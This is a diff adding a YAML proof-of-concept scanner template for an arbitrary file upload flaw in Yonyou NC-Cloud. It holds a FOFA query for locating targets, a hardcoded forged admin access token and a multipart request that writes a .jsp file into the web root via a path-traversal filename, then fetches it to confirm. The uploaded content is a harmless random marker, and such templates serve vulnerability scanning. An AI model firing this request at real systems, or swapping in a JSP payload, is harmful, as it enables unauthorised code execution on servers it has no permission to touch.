@@ -1,0 +1,31 @@
+id: poc-yaml-yongyou-nc-cloud-importhttpscer-anyfile-upload
+info:
+  name: 用友NC-Cloud importhttpscer 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 用友-NC-Cloud
+  fofa: body="/Client/Uclient/UClient.exe"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /nccloud/mob/pfxx/manualload/importhttpscer
+  headers:
+    Content-Type: multipart/form-data; boundary=fd28cb44e829ed1c197ec3bc71748df0
+    accessToken: eyJhbGciOiJIUzUxMiJ9.eyJwa19ncm91cCI6IjAwMDE2QTEwMDAwMDAwMDAwSkI2IiwiZGF0YXNvdXJjZSI6IjEiLCJsYW5nQ29kZSI6InpoIiwidXNlclR5cGUiOiIxIiwidXNlcmlkIjoiMSIsInVzZXJDb2RlIjoiYWRtaW4ifQ.XBnY1J3bVuDMYIfPPJXb2QC0Pdv9oSvyyJ57AQnmj4jLMjxLDjGSIECv2ZjH9DW5T0JrDM6UHF932F5Je6AGxA
+  data: '--fd28cb44e829ed1c197ec3bc71748df0
+
+    Content-Disposition: form-data; name="file"; filename="./webapps/nc_web/{{.t1}}.jsp"
+
+
+    {{.t2}}
+
+    --fd28cb44e829ed1c197ec3bc71748df0--'
+  expression: status_code == 200 && contains(body,`{"code":"1000000000","message":"success"}`)
+- method: GET
+  path: /{{.t1}}.jsp
+  expression: status_code == 200 && contains(body,t2) && contains(headers,"Server:")
+    && !contains(body,"<")
+transport: http
